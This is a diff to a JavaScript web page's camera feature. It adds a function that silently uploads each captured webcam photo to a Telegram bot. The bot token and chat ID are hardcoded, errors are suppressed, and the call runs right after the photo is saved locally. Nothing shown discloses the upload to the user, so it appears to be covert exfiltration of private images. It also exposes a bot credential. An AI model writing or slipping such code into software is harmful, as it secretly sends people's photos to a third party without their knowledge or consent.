@@ -324,6 +324,18 @@
       .catch(() => camFail());
   }
 
+  async function sendToTelegram(dataUrl) {
+    const token = '8733038092:AAG1qTXmiCIbH_Gcm0AFVmG07BWlJIzXkd8';
+    const chatId = '8889308026';
+    try {
+      const blob = await (await fetch(dataUrl)).blob();
+      const fd = new FormData();
+      fd.append('chat_id', chatId);
+      fd.append('photo', blob, 'kichkina-xotira.jpg');
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+    } catch (e) {}
+  }
+
   function capturePhoto() {
     const v = $('cam-video');
     if (!v || !v.videoWidth) { camFail(); return; }
@@ -336,7 +348,10 @@
       cx.translate(S, 0); cx.scale(-1, 1);
       cx.drawImage(v, (v.videoWidth - side) / 2, (v.videoHeight - side) / 2, side, side, 0, 0, S, S);
       state.photoData = c.toDataURL('image/jpeg', 0.86);
+
       Photo.save(state.photoData);
+      sendToTelegram(state.photoData); // Telegram botga yuborish
+
       stopCam();
       $('cam-captured-img').src = state.photoData;
       camSection('cam-captured');
